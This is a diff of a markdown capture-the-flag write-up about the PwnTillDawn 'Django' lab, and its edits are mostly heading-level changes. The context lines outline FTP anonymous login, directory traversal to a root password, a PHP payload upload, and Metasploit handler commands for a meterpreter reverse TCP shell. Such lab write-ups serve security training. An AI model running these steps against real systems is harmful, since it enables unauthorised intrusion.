@@ -11,13 +11,13 @@ img_path: /assets/img/pwntilldawn/django
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Django](https://online.pwntilldawn.com/Target/Show/7) from [PwnTillDawn](https://online.pwntilldawn.com/). The target is running a FTP server where we can directory traversal. With that, we find root password that let us into a login page in the webserver. We then exploit a feature in the service running in the webserver to get foothold into the target machine. With a CVE, were able to get SYSTEM access.
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -113,7 +113,7 @@ Host script results:
 
 There are quite a lot of open ports, but the ones that could be useful to us are 21(FTP), 80(HTTP) and 445(SMB).
 
-## FTP
+### FTP
 
 From the nmap scan, we saw the the ftp server allows anonymous login. So let's connect to ftp as user `anonymous` and a blank password.
 
@@ -195,7 +195,7 @@ Let's see what' on the file.
 
 We got root password.
 
-## WEB
+### WEB
 
 Let's navigate to the webserver http://10.150.150.212/ .
 
@@ -218,7 +218,7 @@ For the other two flags, we can find one in the `c:\xampp` directory, and the ot
 
 ![](7.png)
 
-# **Foothold**
+## **Foothold**
 
 Even though we've got all the flags, let's get a shell.
 
@@ -261,7 +261,7 @@ Great! We can see it got uploaded successfully.
 
 Now go to metasploit and use the multi/handler module and set the following options.
 
-```
+```bash
 set payload php/meterpreter_reverse_tcp
 set lhost tun0
 set lport 9999
@@ -307,5 +307,3 @@ Great! We have SYSTEM privileges now.
 Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
 
 ---
-
-# References
